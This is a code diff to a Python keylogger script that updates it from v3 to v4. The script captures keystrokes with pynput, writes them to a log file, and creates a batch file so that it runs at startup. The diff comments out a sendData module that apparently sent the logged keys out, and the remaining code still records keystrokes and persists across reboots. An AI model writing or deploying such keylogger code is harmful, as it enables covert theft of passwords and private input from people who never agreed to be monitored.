@@ -1,15 +1,15 @@
 import subprocess
 
-check_elevate = subprocess.run(
-    ["pip", "show", "requests"], shell=True, capture_output=True
-).returncode
-if check_elevate == 1:
-    print("INSTALLING REQUESTS...")
-    subprocess.run(["pip", "install", "requests"], shell=True)
-check_elevate = subprocess.run(
+# check_requests = subprocess.run(
+#     ["pip", "show", "requests"], shell=True, capture_output=True
+# ).returncode
+# if check_requests == 1:
+#     print("INSTALLING REQUESTS...")
+#     subprocess.run(["pip", "install", "requests"], shell=True)
+check_pynput = subprocess.run(
     ["pip", "show", "pynput"], shell=True, capture_output=True
 ).returncode
-if check_elevate == 1:
+if check_pynput == 1:
     print("INSTALLING PYNPUT...")
     subprocess.run(["pip", "install", "pynput"], shell=True)
 from pynput.keyboard import Key, Listener
@@ -18,9 +18,11 @@ from time import sleep
 from datetime import datetime
 import recordJSONManager as rjM
 import settingsManager as sM
-import sendData as sD
+
+# import sendData as sD
 from enableRunAtStartUp import createBat
-version = "v3"
+
+version = "v4"
 # Start screen
 print("Starting Key logger ...")
 createBat()
@@ -29,11 +31,11 @@ setting_values = sM.readSetting()
 if setting_values["username"] == "USERNAME":
     returnCode = subprocess.call("start getusername.py", shell=True)
 if setting_values["version"] != version:
-    recordsJson = rjM.readRecordLog()
-    for key in recordsJson:
-        if recordsJson[key]:
-            recordsJson[key] = False
-    rjM.updateRecordLog(recordsJson)
+    # recordsJson = rjM.readRecordLog()
+    # for key in recordsJson:
+    #     if recordsJson[key]:
+    #         recordsJson[key] = False
+    # rjM.updateRecordLog(recordsJson)
     sM.setVersion(version)
     print("Version updated")
 # Global variables
@@ -133,7 +135,7 @@ def writeToFile():
                     lg.write(key)
             keys = []
             in_keys = []
-            sD.sendData()
+            # sD.sendData()
         else:
             print("USERNAME NOT SET")
 
